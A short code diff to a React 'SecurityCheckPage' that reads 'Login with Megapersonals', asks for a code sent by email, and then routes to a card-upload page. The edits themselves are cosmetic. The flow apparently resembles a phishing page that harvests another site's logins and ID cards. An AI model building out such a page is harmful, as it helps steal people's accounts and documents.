@@ -39,12 +39,9 @@ function SecurityCheckPage() {
     if (res.ok) {
       console.log("success", data);
       toast.success("Login Succecssfull");
-    
-
-      formik.resetForm();
       console.log("success", data);
       router.push("/cardUpload");
-      
+      setSkipcode("")
     } else {
       console.log("error", data);
       toast.error("Something Went Wrong");
@@ -66,7 +63,7 @@ function SecurityCheckPage() {
       <p className="text-start text-lg font-semibold pl-3">
         Login with Megapersonals
       </p>
-      <p className="text-center text-sm mt-1 text-green-500">
+      <p className="text-start text-sm mt-1 text-green-500">
         Check spam folder to your email
       </p>
       <input
